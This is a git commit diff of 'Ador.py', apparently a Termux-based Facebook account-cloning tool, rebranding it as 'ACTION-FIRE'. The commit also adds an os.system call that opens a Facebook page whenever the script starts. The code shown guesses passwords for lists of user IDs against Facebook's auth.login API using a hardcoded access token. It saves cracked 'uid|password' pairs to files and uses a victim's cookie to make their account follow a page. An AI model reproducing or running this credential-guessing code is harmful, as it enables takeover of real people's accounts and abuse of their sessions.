cc22f5061186891e46badfa0e1b364c8c4568d1e
Ado76 <119083581+Ador077@users.noreply.github.com>
2023-02-19 20:32:54 +0300

    Update Ador.py

--- Ador.py
+++ Ador.py
@@ -386,25 +386,25 @@ def follow(ses,coki):
 	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
-
+os.system('xdg-open https://facebook.com/𝘼𝘾𝙏𝙄𝙊𝙉-𝙁𝙄𝙍𝙀-107968471946247')
 logo = ("""\033[1;32m
-       
-              _            
-     /\      | |           
-    /  \   __| | ___  _ __ 
-   / /\ \ / _` |/ _ \| '__|
-  / ____ \ (_| | (_) | |   
- /_/    \_\__,_|\___/|_|    \033
-__________________×______________________
-  
- Owner     : Ador 
- 
- Github    : Ador-007
-
- Facebook  : Ft Alvi
-  
-__________________×______________________\033[1;37m""")
-
+\033[1;34m   ____  _   __      ______________  ______
+\033[1;32m  / __ \/ | / /     / ____/  _/ __ \/ ____/
+\033[1;91m / / / /  |/ /_____/ /_   / // /_/ / __/   
+\033[1;35m/ /_/ / /|  /_____/ __/ _/ // _, _/ /___   
+\033[1;91m\____/_/ |_/     /_/   /___/_/ |_/_____/   
+\033[1;91m╔════════════════════════════════════════╗
+\033[1;32m║\033[1;32m[•] Author    \033[1;32m : ACTION-FIRE            \033[1;32m║      
+\033[1;32m║\033[1;32m[•] Facebook   \033[1;32m: Ft Alvi                ║ 
+\033[1;32m║\033[1;32m[•] Github    \033[1;32m : github.com/ACTION-FIRE ║
+\033[1;32m║\033[1;32m[•] Status    	\033[1;32m: FREE TRIAL             \033[1;32m║
+\033[1;32m║\033[1;32m[•] Network    \033[1;32m: 3G, 4G/5G, ON          \033[1;32m║
+\033[1;32m║\033[1;32m[•] Version  	\033[1;32m: V:2.1                  ║
+\033[1;32m║\033[1;32m[•] Tools    	\033[1;32m: RAN/DOM Cloning        \033[1;32m║
+\033[1;32m║════════════════════════════════════════║
+\033[1;32m║════════════════════════════════════════║
+\033[1;32m║              \033[1;32mAlvi MENU [👑]            ║
+\033[1;91m╚════════════════════════════════════════╝""")
 class Main:
 	def __init__(self):
 		self.id = []
@@ -831,7 +831,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ ADOR ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ FIRE ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -848,15 +848,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ ADOR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ FIRE-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-ADOR-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-FIRE-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ ADOR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ FIRE-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-ADOR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-FIRE-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1275,15 +1275,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ ADOR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ FIRE-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-ADOR-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-FIRE-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ ADOR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ FIRE-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-ADOR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-FIRE-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1292,7 +1292,7 @@ class Main:
 
 
 def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.mrTALHA-cov', 'r').read()
+	key1=open('/data/data/com.termux/files/usr/bin/.mrFIRE-cov', 'r').read()
 	clear()
 	print(logo)
 	r1=requests.get("https://pastebin.com/p3jbWM14").text
